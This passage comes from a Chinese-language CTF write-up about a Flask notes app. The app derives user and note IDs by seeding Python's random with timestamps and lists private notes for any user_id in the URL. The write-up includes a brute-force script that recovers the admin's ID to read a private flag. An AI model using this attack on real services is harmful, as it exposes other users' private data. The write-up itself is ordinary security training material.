                &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;

            &lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

            &lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fromtimestamp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;datetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timezone&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;utc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; %H:%M UTC&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;#获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;note_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_random_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

            &lt;span class=&#34;n&#34;&gt;note&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;note_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                        &lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                        &lt;span class=&#34;n&#34;&gt;prv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;create.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，我们&lt;code&gt;post_at&lt;/code&gt;已经知道&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144023.png&#34; alt=&#34;image-20210119142946848&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;那么在下面这张图里，我们只有&lt;code&gt;user_id&lt;/code&gt;不知道&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144031.png&#34; alt=&#34;image-20210119142616697&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;而my_note()的else里面只需要&lt;code&gt;user_id&lt;/code&gt;就可以列出所有私有note&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/my_notes&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;my_notes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filter_by&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Note&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filter_by&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;notes&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;note&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;note_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note_id&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;notes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;my_notes.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;notes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;notes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是我们可以根据已知的&lt;code&gt;note_id&lt;/code&gt;和&lt;code&gt;post_at&lt;/code&gt;来&lt;del&gt;反推&lt;/del&gt;爆破&lt;code&gt;user_id&lt;/code&gt;，只要算出admin的id即可看到发布的私有flag。&lt;/p&gt;
&lt;p&gt;因为时间戳精确到了小数点后四位，我们知道的&lt;code&gt;post_at&lt;/code&gt;是分钟级别的，所以这里需要爆破最多&lt;code&gt;10000*60&lt;/code&gt;次&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;datetime&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_random_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;alphabet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ascii_lowercase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;alphabet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)])&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;2021-01-15 02:29 UTC&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#admin发布的第一个Pubic note时间&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#小数部分，l是一个列表&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;ta1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strptime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;2021-01-15 10:29:{} UTC&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; %H:%M:%S UTC&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#格式化时间，因为时区不同需要加8小时    &lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;ta&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mktime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ta1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#转换为时间戳&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ta&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#整数部分与小数部分拼接&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;u_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_random_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

        &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;post_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;p_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_random_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#admin发布的第一个Pubic note&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;#算出来admind的userid是7bdeij4oiafjdypqyrl2znwk7w9lulgn&lt;/span&gt;
        
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8999&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有一个坑，因为时区原因，从获得的时间反推时间戳的时候需要加8个小时&lt;/p&gt;
